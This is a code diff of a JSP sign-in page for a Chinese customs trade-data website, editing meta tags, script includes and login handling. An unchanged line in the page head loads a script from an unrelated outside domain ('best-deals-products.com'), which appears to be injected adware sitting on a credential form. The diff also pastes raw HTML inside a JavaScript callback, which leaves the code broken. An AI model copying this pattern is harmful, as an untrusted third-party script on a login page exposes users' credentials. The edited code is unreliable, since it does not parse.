@@ -34,7 +34,7 @@ request.getSession().setAttribute("language","message_en_US");
     <meta name="author" content="">
     <meta name="keywords" content="数据, 趣易贸易数据系统,海关数据,进出口数据,海关数据查询,中国出口数据,中国海关数据,海关统计数据,免费海关数据,美国海关数据,印度海关数据,全球海关数据查询,免费数据" /><meta name="description" content="趣易贸易数据系统为您提供：权威、及时、专业的海关信息在线数据订单下载系统。趣易贸易数据平台第一时间发布中国海关数据，关注中国外贸形式发展，提供8位海关数据编码统计信息和全球买家资源的在线查询服务。趣易您专业的信息资讯服务提供商。全国统一热线：400-1816-008" />
 	<meta name="description" content="南通趣易专业致力于挖掘海关数据,整合全球海关数据带来价值,趣易全球贸易通帮助用户了解国外买家的信息,预测未来防范风险,开发国际贸易市场.趣易全球贸易通主要提供美国,墨西哥,阿根廷,智利,秘鲁,哥伦比亚,乌拉圭,巴拉圭,厄瓜多尔,巴西,委内瑞拉,玻利维亚,俄罗斯,乌克兰,韩国,印度,巴基斯坦,英国,西班牙共二十一个国家的海量贸易数据和数据分析报告,同时趣易提供免费数据样本下载"/>
-	<meta name="copyright" content="2012-2013 Comsenz Inc." />
+	<meta name="copyright" content="Inforvellor inc." />
 	<meta name="MSSmartTagsPreventParsing" content="True" />
 	<meta http-equiv="MSThemeCompatible" content="Yes" />
 	<meta http-equiv="Expires" CONTENT="0">
@@ -46,11 +46,10 @@ request.getSession().setAttribute("language","message_en_US");
 	<script type='text/javascript' src='${pageContext.request.contextPath }/static/js/promptmessage.js'></script>
 	<script type="text/javascript" src="${ctx }/webInfo/js/infologin.js"></script>
     <script type="text/javascript" src="${pageContext.request.contextPath }/webInfo/newregister.js"></script>
-	<script type="text/javascript"	src="${pageContext.request.contextPath }/static/js/easyui/jquery.easyui.min.js"></script>
 	<script type="text/javascript" src="${pageContext.request.contextPath }/static/artDialog4.1.6/artDialog.source.js?skin=twitter"></script>
 	<script type="text/javascript" src="${pageContext.request.contextPath }/static/artDialog4.1.6/plugins/iframeTools.source.js" ></script>
 	<script type="text/javascript" src="${pageContext.request.contextPath }/static/js/artdialogopen.js" ></script>
-	
+	<script type="text/javascript" src="js/jquery-2.1.3.min.js"></script>
 
     <title>Sign in</title>
 
@@ -71,13 +70,10 @@ request.getSession().setAttribute("language","message_en_US");
     <![endif]-->
   <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>
 <script type="text/javascript">
-  $(function(){
-   myRandReload();
-  });
+  <!--Login Handling-->
 	function loginSubmit(){	
 		 if(checkAccount()&&checkPassword()){
 			 $("#loginWait").empty();
-			 $("#loginWait").append("<a style=\"background:url('${ctx}/webInfo/infobase_login/img/bg_button_blue.gif');\" class=\"dl\" >登录中......</a>");
 			 return true;
 		 }
 		 return false;
@@ -131,11 +127,15 @@ request.getSession().setAttribute("language","message_en_US");
 							function(data){
 							
 							if("2" == data){
-								$.messager.alert('<fmt:message key="common.Prompt" bundle="${messages}"/>','<fmt:message key="common.passiscorr" bundle="${messages}"/>','info');
+								<div class="alert alert-error">
+    								<a href="#" class="close" data-dismiss="alert">&times;</a>
+    								('<fmt:message key="common.Prompt" bundle="${messages}"/>','<fmt:message key="common.passiscorr" bundle="${messages}"/>','info')
+    								</div>
 								$("#loginWait").empty();
 								$("#loginWait").append("<input type=\"button\" name=\"login\" class=\"dl\" value=\"登录\" onclick=\"javascript:usersub();\"/>");
 								$("#user_pass").val("");
 								myRandReload();
+
 							}
 							else if("3" == data){
 								$.messager.alert('<fmt:message key="common.Prompt" bundle="${messages}"/>','<fmt:message key="common.Usernotexist" bundle="${messages}"/>','info');
@@ -177,20 +177,6 @@ request.getSession().setAttribute("language","message_en_US");
 		}
 	}
 
-	function over(){
-		$("#wjmm").css("color","red");
-	}
-
-	function out(){
-		$("#wjmm").css("color","#1b66c7");
-	}
-	function over_movie(){
-		$("#movie").css("color","red");
-	}
-
-	function out_movie(){
-		$("#movie").css("color","#1b66c7");
-	}
 	document.onkeydown = function (e) {
 	var theEvent = window.event || e;
 	var code = theEvent.keyCode || theEvent.which;
